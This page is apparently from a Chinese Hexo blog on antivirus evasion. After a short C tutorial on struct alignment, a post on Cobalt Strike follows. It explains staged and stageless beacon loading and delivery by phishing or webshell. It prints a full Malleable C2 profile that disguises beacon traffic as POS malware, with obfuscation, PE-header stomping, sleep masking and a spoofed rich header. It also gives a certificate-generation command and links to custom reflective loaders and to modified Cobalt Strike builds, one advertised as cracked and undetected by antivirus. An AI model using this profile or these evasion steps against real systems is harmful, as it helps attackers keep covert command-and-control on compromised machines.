<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">char</span> b;</span><br><span class="line">&#125;;</span><br><span class="line">test t1;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Books</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">char</span> title[<span class="number">50</span>];</span><br><span class="line"><span class="type">char</span> author[<span class="number">50</span>];</span><br><span class="line"><span class="type">char</span> subject[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> book_id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="keyword">struct</span> Books b1)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;title:%s\n&quot;</span>, b1.title);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;author:%s\n&quot;</span>, b1.author);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;subject:%s\n&quot;</span>, b1.subject);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;book_id:%d\n&quot;</span>, b1.book_id);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Books</span> <span class="title">b1</span>;</span></span><br><span class="line"><span class="built_in">strcpy</span>(b1.title, <span class="string">&quot;test1&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(b1.author, <span class="string">&quot;jack&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(b1.subject, <span class="string">&quot;test_subject&quot;</span>);</span><br><span class="line">b1.book_id=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">x</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">char</span> b;</span><br><span class="line"><span class="type">char</span> c;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">y</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">char</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line"><span class="type">char</span> c;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="keyword">sizeof</span>(x));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="keyword">sizeof</span>(y));</span><br><span class="line">x x1;</span><br><span class="line">y y1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="keyword">sizeof</span>(x1));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="keyword">sizeof</span>(y1));</span><br></pre></td></tr></table></figure>

<p>结构体对齐，n为字节对齐，默认为8，可填1、2、4、8，如果n的值比 sizeof() 得出的值小，则以n的 值对齐，否则以 sizeof() 的值对齐 结构体的总大小必须是其内部最大成员的整数倍</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/C%E8%AF%AD%E8%A8%80/" data-id="cm1zwlrfk0002u0v66ol62e5s" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-免杀/Cobalt Strike" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/Cobalt%20Strike/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.550Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Stage-Stageless"><a href="#Stage-Stageless" class="headerlink" title="Stage&amp;Stageless"></a>Stage&amp;Stageless</h1><p>作为渗透者，我们现在需要用CS把我们的beacon植入到目标的机器上，无非就是两种情况</p>
<p><strong>1.钓鱼</strong></p>
<p><strong>2.webshell上传beacon</strong></p>
<p>问题在于如果按照默认生成的beacon比较大，目标机器也可能有不挂代理不出网的情况，那么这时候应该怎么办呢</p>
<p>这时候Stage（分段）的思想就应运而生，下图中Stageless就是不分段的，另一个就是Stage</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241006102722220.png" alt="image-20241006102722220"></p>
<p>从直观的体积上来说，两者就有比较大的差距，左边是Stage，右边是Stageless</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241006103200255.png" alt="image-20241006103200255"></p>
<p>它们的上线方式也略有不同，这里先不考虑其他的，把杀软什么关干净，先上线</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241006103901335.png" alt="image-20241006103901335"></p>
<p>在分段的exe里面有三块Commit内存，我标注了出来</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241006104658244.png" alt="image-20241006104658244"></p>
<p>照着这三块内存我们就可以说一下Stage是怎么加载的,我在下面标注了分配步骤的内存大小</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 申请一个块儿内存（allocate memory）<span class="comment">//4kb</span></span><br><span class="line"><span class="number">2.</span> 复制Stager去这一块儿内存里</span><br><span class="line"><span class="number">3.</span> 创建一个线程，运行这个Stager</span><br><span class="line"><span class="number">4.</span> 这个Stager会再次申请一块儿内存（allocate memory）<span class="comment">//(abort 300kb)</span></span><br><span class="line"><span class="number">5.</span> Stager去下载加密的payload，写入申请的内存中</span><br><span class="line"><span class="number">6.</span> Stager把执行流程转递给这个加密的payload</span><br><span class="line"><span class="number">7.</span> 加密的payload自解密成Reflective DLL</span><br><span class="line"><span class="number">8.</span> 然后把执行流程传递给Reflective DLL</span><br><span class="line"><span class="number">9.</span> Reflective DLL 申请一个块儿内存（allocate memory）<span class="comment">//(4096kb)</span></span><br><span class="line"><span class="number">10.</span> 然后初始化自己在新的内存里面</span><br><span class="line"><span class="number">11.</span> 最后reflective DLL 调用payload的入口点函数</span><br></pre></td></tr></table></figure>

<p>上面的过程<strong>简而言之</strong>，就是先给Stager申请一块小内存，Stager自己申请一块内存，然后与C2服务器通信将Loader（CS自己实现的等价于LoadLibrary的一个东西）和其他要用到的dll加密成payload发送到机器上，最后在为这些内容申请空间，解密，然后执行加载上线</p>
<p>另一个体积比较大的Stageless则是只申请了两块内存，同样我们在Process Hacker中也可以看见，特征还是比较明显的RWX权限</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241006105812149.png" alt="image-20241006105812149"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 申请一个块儿内存（allocate memory）</span><br><span class="line"><span class="number">2.</span> 复制stageless去这一块儿内存里</span><br><span class="line"><span class="number">3.</span> 创建一个线程，运行这个stageless</span><br><span class="line"><span class="number">4.</span> Reflective DLL 申请一个块儿内存（allocate memory）</span><br><span class="line"><span class="number">5.</span> 然后初始化自己在新的内存里面</span><br><span class="line"><span class="number">6.</span> 最后reflective DLL 调用payload的入口点函数</span><br></pre></td></tr></table></figure>



<p>讲到这里我们就引出了这两个上线的方法，无论什么方式，它的行为特征是<strong>比较明显</strong>的，就单纯用exe上线是肯定不行的。如果硬要使用，就要加上壳或者是从源码上对生成的beacon端的行为，生成目标等进行二开，抹掉CS本来的特征</p>
<p>随便一说，这些申请的内存里面我们的恶意文件完全没有混淆，是可以看见Java类或者ip这种信息的，不混淆想要躲过内存扫描是非常幽默的</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241006114047642.png" alt="image-20241006114047642"></p>
<h1 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h1><p>shellcode是一段与位置无关的代码，首先他是一段二进制编码，由于他的功能常常是返回shell的原因， 所以一般将这样一段代码称为shellcode。</p>
<p><strong>shellcode的关键在于“与位置无关”</strong></p>
<p>在CS中也可以帮助我们去编写一些shellcode，但是这些shellcode本身也是基本遵循上面Stage或者Stageless两种方式进行上线，所以如果裸着还是很容易被查杀的</p>
<h1 id="C2-profile"><a href="#C2-profile" class="headerlink" title="C2 profile"></a>C2 profile</h1><p>为了应对行为检测，Cobalt Strike提供了一个功能Malleable C2 Profile，它让我们可以手动去配置一些操作shellcode中一些字符串的替换，pe文件的敏感标识替换，包括申请内存，注入等等使用的 winapi，shellcode的混淆，配置了C2 profile之后，我们的shellcode就算是没有异或加密也能在一定程度上过杀软</p>
<h2 id="证书生成"><a href="#证书生成" class="headerlink" title="证书生成"></a>证书生成</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -alias Bob -keyalg RSA -validity <span class="number">36500</span> -keystore Bob.store</span><br></pre></td></tr></table></figure>

<p>有输入密码的操作需要记住密码</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241006112055157.png" alt="image-20241006112055157"></p>
<h3 id="创建C2-profile文件"><a href="#创建C2-profile文件" class="headerlink" title="创建C2.profile文件"></a>创建C2.profile文件</h3><p>这里我给一个示例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> sample_name <span class="string">&quot;tryblog POS Malware&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> sleeptime <span class="string">&quot;5000&quot;</span>; <span class="meta"># use a ~30s delay between callbacks</span></span><br><span class="line"><span class="built_in">set</span> jitter    <span class="string">&quot;10&quot;</span>;    <span class="meta"># throw in a 10% jitter</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> useragent <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0&quot;</span>;</span><br><span class="line"></span><br><span class="line">#设置证书，注意以下内容得和你之前生成的证书一样</span><br><span class="line">https-certificate &#123;</span><br><span class="line">    <span class="built_in">set</span> CN       <span class="string">&quot;Bob&quot;</span>; </span><br><span class="line">    <span class="built_in">set</span> O        <span class="string">&quot;WwW&quot;</span>;   </span><br><span class="line">    <span class="built_in">set</span> C        <span class="string">&quot;dsd&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> L        <span class="string">&quot;Bankok&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> OU       <span class="string">&quot;WWw&quot;</span>;  </span><br><span class="line">    <span class="built_in">set</span> ST       <span class="string">&quot;Tosimoli&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> validity <span class="string">&quot;365&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">#设置，修改成你的证书名称和证书密码</span><br><span class="line">code-signer&#123;</span><br><span class="line">    <span class="built_in">set</span> keystore <span class="string">&quot;Bob.store&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> password <span class="string">&quot;1qazxsw2&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> alias <span class="string">&quot;Bob&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#指定DNS beacon不用的时候指定到IP地址</span><br><span class="line"><span class="built_in">set</span> dns_idle <span class="string">&quot;8.8.4.4&quot;</span>;</span><br><span class="line"></span><br><span class="line">#每个单独DNS请求前强制睡眠时间</span><br><span class="line"><span class="built_in">set</span> dns_sleep <span class="string">&quot;0&quot;</span>;</span><br><span class="line"></span><br><span class="line">#通过DNS上载数据时主机名的最大长度[<span class="number">0</span><span class="number">-255</span>]</span><br><span class="line"><span class="built_in">set</span> maxdns    <span class="string">&quot;235&quot;</span>;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/windebug/updcheck.php /aircanada/dark.php /aero2/fly.php /windowsxp/updcheck.php /hello/flash.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;text/plain&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;en-us&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Encoding&quot;</span> <span class="string">&quot;text/plain&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/x-www-form-urltrytryd&quot;</span>;</span><br><span class="line"></span><br><span class="line">        id &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            parameter <span class="string">&quot;id&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend <span class="string">&quot;&amp;op=1&amp;id=vxeykS&amp;ui=Josh @ PC&amp;wv=11&amp;gr=backoff&amp;bv=1.55&amp;data=&quot;</span>;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        output &#123;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/updates&quot;</span>;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            netbiosu;</span><br><span class="line">            prepend <span class="string">&quot;user=&quot;</span>;</span><br><span class="line">            header <span class="string">&quot;Cookie&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;text/plain&quot;</span>;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重现上线</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241006113524838.png" alt="image-20241006113524838"></p>
<h2 id="编写Profile"><a href="#编写Profile" class="headerlink" title="编写Profile"></a>编写Profile</h2><p>在自己的Profile里面加入下面内容，这里面有点门道，因为是测试环境，我就随便找了别人写的，但是越多人用，被杀软标记的可能就越高（比如我们的默认C2Profile）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">stage &#123;</span><br><span class="line">    # 开启混淆，对生成的Beacon shellcode进行混淆</span><br><span class="line">    <span class="built_in">set</span> obfuscate <span class="string">&quot;true&quot;</span>;</span><br><span class="line"></span><br><span class="line">    # 开启PE头覆盖，修改已加载的DLL的PE头部以逃避安全软件的检测</span><br><span class="line">    <span class="built_in">set</span> stomppe <span class="string">&quot;true&quot;</span>;</span><br><span class="line"></span><br><span class="line">    # 开启清理功能，清理为Beacon加载而创建的资源，如线程和句柄</span><br><span class="line">    <span class="built_in">set</span> cleanup <span class="string">&quot;true&quot;</span>;</span><br><span class="line"></span><br><span class="line">    # 让分配给Beacon的内存区域同时具有读、写和执行权限</span><br><span class="line">    <span class="built_in">set</span> userwx <span class="string">&quot;true&quot;</span>;</span><br><span class="line"></span><br><span class="line">    # 开启智能注入，尝试避免在注入Beacon时引起异常</span><br><span class="line">    <span class="built_in">set</span> smartinject <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    # 在负载处于休眠状态时，对内存中的Beacon负载进行操作，改变其内存中的表现形式，使其更难被检测</span><br><span class="line">    <span class="built_in">set</span> sleep_mask <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    # 设置内存分配器的类型，使用Windows API中的<span class="string">&quot;VirtualAlloc&quot;</span>函数</span><br><span class="line">    <span class="built_in">set</span> allocator <span class="string">&quot;VirtualAlloc&quot;</span>;</span><br><span class="line"></span><br><span class="line">    # 定义用于替换Beacon反射性DLL的PE头的自定义字节</span><br><span class="line">    <span class="built_in">set</span> magic_pe <span class="string">&quot;LE&quot;</span>;</span><br><span class="line"></span><br><span class="line">    # 定义PE头部的各个属性</span><br><span class="line">    <span class="built_in">set</span> checksum       <span class="string">&quot;0&quot;</span>;  # 设置PE头部的校验和</span><br><span class="line">    <span class="built_in">set</span> entry_point    <span class="string">&quot;13760&quot;</span>;  # 设置PE头部的入口点</span><br><span class="line">    <span class="built_in">set</span> image_size_x86 <span class="string">&quot;548864&quot;</span>;  # 设置PE头部的图像大小（x86）</span><br><span class="line">    <span class="built_in">set</span> image_size_x64 <span class="string">&quot;548864&quot;</span>;  # 设置PE头部的图像大小（x64）</span><br><span class="line">    <span class="built_in">set</span> name           <span class="string">&quot;wwanapi.dll&quot;</span>;  # 设置PE头部的名称</span><br><span class="line"></span><br><span class="line">    # 设置用于替换Beacon反射性DLL的Rich Header的自定义字节</span><br><span class="line">    <span class="built_in">set</span> rich_header    <span class="string">&quot;\x39\x39\x83\xe8\x7d\x58\xed\xbb\x7d\x58\xed\xbb\x7d\x58\xed\xbb\x74\x20\x7e\xbb\x3b\x58\xed\xbb\x26\x30\xee\xba\x7e\x58\xed\xbb\x26\x30\xe9\xba\x69\x58\xed\xbb\x7d\x58\xec\xbb\xbf\x58\xed\xbb\x26\x30\xec\xba\x78\x58\xed\xbb\x26\x30\xe8\xba\x71\x58\xed\xbb\x26\x30\xed\xba\x7c\x58\xed\xbb\x26\x30\xe3\xba\x1f\x58\xed\xbb\x26\x30\x12\xbb\x7c\x58\xed\xbb\x26\x30\xef\xba\x7c\x58\xed\xbb\x52\x69\x63\x68\x7d\x58\xed\xbb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Fork-Run"><a href="#Fork-Run" class="headerlink" title="Fork&amp;Run"></a>Fork&amp;Run</h1><p>这指的是一种执行模式，我们下发某些命令给beacon时，他的执行流程是通过新起一个进程，然后将某 些功能注入到新起的进程中执行，最后通过管道将执行结果回传。</p>
<p>cobalt strike这样做的原因有很多：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>如果执行的功能崩溃，可以保护原有的beacon。</span><br><span class="line"><span class="number">2.</span>从历史上看，该方案使 x86 信标无缝启动 x64 后期开发任务。这一点很关键，因为 Beacon 直</span><br><span class="line">到 <span class="number">2016</span> 年才构建 x64。</span><br><span class="line"><span class="number">3.</span>某些功能可以针对特定的远程进程。这允许 post-ex 操作在不同的上下文中发生，而无需在其他</span><br><span class="line">上下文中迁移或生成有效负载。</span><br><span class="line"><span class="number">4.</span>此设计决策将您的 post-ex 操作生成的大量混乱（线程、可疑内容）保留在您的 Beacon 进程空</span><br><span class="line">间之外。</span><br></pre></td></tr></table></figure>

<p>这种早期设计理念比先进的办法在现在反倒成为了问题，因为大部分安全厂商对注入都有所防备</p>
<p>比如WinAPI里面的CreateRemoteThread，又是0环hook，又是SSDT hook</p>
<h1 id="从这往下的东西我没有实践"><a href="#从这往下的东西我没有实践" class="headerlink" title="从这往下的东西我没有实践"></a>从这往下的东西我没有实践</h1><h1 id="UDRL"><a href="#UDRL" class="headerlink" title="UDRL"></a>UDRL</h1><p>User Defined Reflective Loader，它允许你自定义 ReflectiveLoader ，也就是反射loader。 我们植入的beacon，实际上到最后他都是一个dll，名为beacon.dll，功能实现都在这个dll里面，他是真 正的payload。我们知道加载一个dll，<strong>一般来说可以使用winapi loadlibary</strong> ，但是这样太容易被侦察 到，用系统api会留下很多痕迹。 那么还有一种方式加载dll就是通过自写反射加载loader去加载，<strong>实际上是自写了一个loadlibary</strong>，<strong>并且 是无需落地的</strong>，他的实现关键之处也是需要修正重定位表和导入表一类的，具体实现可以谷歌搜索：反 射dll加载。 对于Cobalt Strike而言呢，在4.4版本以前，反射加载的loader是写死了的，有非常多的特征，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">现有项目比较好用的有：</span><br><span class="line">https:<span class="comment">//github.com/boku7/BokuLoader</span></span><br><span class="line">https:<span class="comment">//github.com/mgeeky/ElusiveMice</span></span><br><span class="line">https:<span class="comment">//github.com/Cracked5pider/KaynStrike</span></span><br></pre></td></tr></table></figure>

<h1 id="一些简单的二开"><a href="#一些简单的二开" class="headerlink" title="一些简单的二开"></a>一些简单的二开</h1><p>对你的cs进行一些简单的二开也能够帮助你规避一些空间探测引擎或者各种扫描，谷歌搜索：cs二开。 一般来说有这些地方进行简单的修改就可以实现：</p>
<p><strong>有一个项目<a target="_blank" rel="noopener" href="https://gitee.com/cream492/Awesome-CobaltStrike">Awesome-CobaltStrike</a>，Gitee上貌似已经封了，讲了很多关于CS怎么二开在怎么用的问题</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/CYJoe-Cyclone/Awesome-CobaltStrike#:~:text=A%20Cobalt%20Strike%20Beacon%20Object%20File">https://github.com/CYJoe-Cyclone/Awesome-CobaltStrike#:~:text=A%20Cobalt%20Strike%20Beacon%20Object%20File</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">修改监听不返回任何数据(带user-agent的请求302，不带的不返回任何数据)</span><br><span class="line">添加teamserver认证白名单限制登陆IP</span><br><span class="line">去除checksum8特征</span><br><span class="line">免杀VT全绿</span><br><span class="line">默认证书已替换</span><br><span class="line">防止stage被扫</span><br><span class="line">去除listenerConfig特征字符串</span><br><span class="line">cs去除beaconeye特征</span><br><span class="line">修复CVE-2022-39197</span><br><span class="line">cs修复错误路径泄漏stage</span><br><span class="line">增加谷歌动态密码(身份验证器)</span><br><span class="line">修复cs4.5的foreign派生bug</span><br><span class="line">添加中文汉化翻译</span><br><span class="line">内置破解</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当然，最有效的方式仍然是二开beacon端，但相对来说既繁琐难度也相对较大，已有可参考的项目有：</span><br><span class="line">https://github.com/WBGlIl/ReBeacon_Src</span><br><span class="line">https://github.com/darkr4y/geacon</span><br><span class="line">https://github.com/mai1zhi2/SharpBeacon</span><br><span class="line">https://github.com/Z3ratu1/geacon_plus</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/Cobalt%20Strike/" data-id="cm1zwlrfj0001u0v64sjc610j" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E9%9A%90%E8%97%8F%E5%AF%BC%E5%85%A5%E8%A1%A8/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E8%BF%9B%E7%A8%8B%E5%BC%BA%E6%9D%80/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E8%B0%83%E8%AF%95/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E7%86%B5%E4%B8%8E%E8%87%AA%E7%AD%BE%E5%90%8D/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
